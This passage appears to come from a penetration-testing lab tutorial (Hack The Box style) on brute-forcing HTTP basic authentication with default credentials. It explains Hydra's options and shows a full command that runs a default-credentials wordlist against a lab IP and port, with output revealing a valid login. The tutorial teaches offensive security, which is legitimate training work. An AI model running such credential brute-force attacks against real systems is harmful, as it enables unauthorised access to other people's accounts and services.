Default passwords wordlist exists https://github.com/ihebski/DefaultCreds-cheat-sheet

|**Options**|**Description**|
|---|---|
|`-C ftp-betterdefaultpasslist.txt`|Combined Credentials Wordlist|
|`SERVER_IP`|Target IP|
|`-s PORT`|Target Port|
|`http-get`|Request Method|
|`/`|Target Path|

The assembled command results:

  Default Passwords

```shell-session
canklesmaks@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://178.211.23.155:31099/
[31099][http-get] host: 178.211.23.155   login: test   password: testingpw
[STATUS] attack finished for 178.211.23.155 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```
